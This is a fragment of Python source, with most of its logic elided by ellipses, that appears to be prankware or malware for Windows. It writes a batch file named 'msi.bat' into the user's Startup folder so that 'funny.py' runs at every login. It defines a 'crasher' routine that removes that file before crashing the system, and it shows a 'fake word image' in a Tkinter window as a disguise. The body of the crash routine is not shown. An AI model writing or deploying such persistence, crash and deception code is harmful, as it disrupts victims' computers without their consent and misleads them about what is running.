...
try:
    ...
    def add_to_startup(file_path=""):
        ...
        with open(bat_path + '\\' + "msi.bat", "w+") as bat_file:
            bat_file.write(f'start "" "{file_path}\\funny.py"')
    def started():
        #definitions
        def crasher():
            #deleting the bat before crash so it would start over again
            bat_path = r'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' % USER_NAME
            os.remove(f"{bat_path}\msi.bat")
            #the actual crasher
        ...
        #fake word image
        f = frame = tk.Frame(m, width=384, height=216)
        frame.pack()
        frame.place(anchor='center', relx=0.5, rely=0.5)
        file_path = os.path.dirname(os.path.realpath(__file__))
        img = ImageTk.PhotoImage(Image.open(f"{file_path}\mca.png"))
